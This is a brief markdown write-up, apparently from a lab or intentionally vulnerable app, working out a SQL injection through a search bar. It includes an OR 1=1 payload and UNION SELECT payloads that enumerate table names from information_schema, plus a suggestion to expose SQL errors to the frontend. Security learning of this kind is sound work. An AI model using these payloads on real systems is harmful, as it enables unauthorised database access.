# SQL Injection

Simples sql injection is possible by putting `'OR 1=1) -- '` in the search bar

### Thought process

Could be good to allow user to look into the query syntax somehow on error (return sql errors straight to the fronted?)

Next step is getting info about tables:
`') UNION ALL SELECT 1, 2, 3, 4 FROM information_schema.tables -- .`

INFORMATION_SCHEMA.TABLES have columns:

> TABLE_NAME, ENGINE, VERSION, ROW_FORMAT, TABLE_ROWS, AVG_ROW_LENGTH,
> DATA_LENGTH, MAX_DATA_LENGTH, INDEX_LENGTH, DATA_FREE, AUTO_INCREMENT,
> CREATE_TIME, UPDATE_TIME, CHECK_TIME, TABLE_COLLATION, CHECKSUM,
> CREATE_OPTIONS, TABLE_COMMENT

Useful are probably those:

> TABLE_NAME, TABLE_ROWS

`') UNION ALL SELECT table_name, null,null,null FROM information_schema.tables -- .`
